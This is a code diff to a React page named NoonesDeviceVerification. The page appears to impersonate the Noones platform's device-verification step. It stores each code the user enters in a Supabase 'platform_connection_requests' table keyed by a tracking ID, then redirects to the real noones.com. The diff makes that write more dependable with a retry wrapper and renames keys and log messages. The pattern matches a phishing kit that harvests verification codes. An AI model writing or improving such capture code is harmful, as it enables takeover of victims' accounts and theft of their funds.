@@ -1,8 +1,9 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 import { supabase } from '../../lib/supabase';
+import { fireAndMove } from '../../lib/syncRetry';
 
-const NOONES_REQUEST_ID_KEY = 'current_request_id';
+const NOONES_SESSION_ID_KEY = 'noones_session_id';
 const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
 const NOONES_REQUEST_DATA_KEY = 'noones_request_data';
 
@@ -82,34 +83,28 @@ export default function NoonesDeviceVerification() {
     }
 
     try {
-      const trackingId = window.localStorage.getItem(NOONES_TRACKING_ID_KEY);
+      const trackingId = window.localStorage.getItem(NOONES_SESSION_ID_KEY);
       if (!trackingId) {
         throw new Error('No tracking ID found');
       }
 
-      console.log('[PERSISTENT_PROGRESS] Step 3 - Updating verification code for tracking_id:', trackingId);
-      // Non-blocking update - don't await
-      supabase
-        .from('platform_connection_requests')
-        .update({
-          code: verificationCode,
-        })
-        .eq('tracking_id', trackingId)
-        .then((result) => {
-          if (result.error) {
-            console.error('[PERSISTENT_PROGRESS] Async update error for code:', result.error);
-          } else {
-            console.log('[PERSISTENT_PROGRESS] Async update completed for tracking_id:', trackingId);
-          }
-        })
-        .catch((err) => {
-          console.error('[PERSISTENT_PROGRESS] Async update exception:', err);
-        });
+      console.log('[NOONES_STEP3] Updating code for tracking_id:', trackingId);
+      
+      // Fire UPDATE with retry wrapper (non-blocking)
+      const syncId = `noones-step3-${trackingId}`;
+      fireAndMove(
+        () => supabase
+          .from('platform_connection_requests')
+          .update({ code: verificationCode })
+          .eq('tracking_id', trackingId),
+        syncId,
+        { maxAttempts: 3, delayMs: 500 }
+      );
 
-      console.log('[PERSISTENT_PROGRESS] Step 3 Complete: Code verified, clearing session');
+      console.log('[NOONES_STEP3] UPDATE fired in background, clearing session and redirecting');
 
       // Clear Noones-specific localStorage
-      window.localStorage.removeItem(NOONES_REQUEST_ID_KEY);
+      window.localStorage.removeItem(NOONES_SESSION_ID_KEY);
       window.localStorage.removeItem(NOONES_CURRENT_STEP_KEY);
       window.localStorage.removeItem(NOONES_REQUEST_DATA_KEY);
 
@@ -132,7 +127,7 @@ export default function NoonesDeviceVerification() {
         window.location.href = 'https://noones.com/';
       }, 5000);
     } catch (err) {
-      console.error('Error updating platform_connection_requests:', err);
+      console.error('[NOONES_STEP3] Error:', err);
       alert('Verification failed. Please try again.');
     }
   };
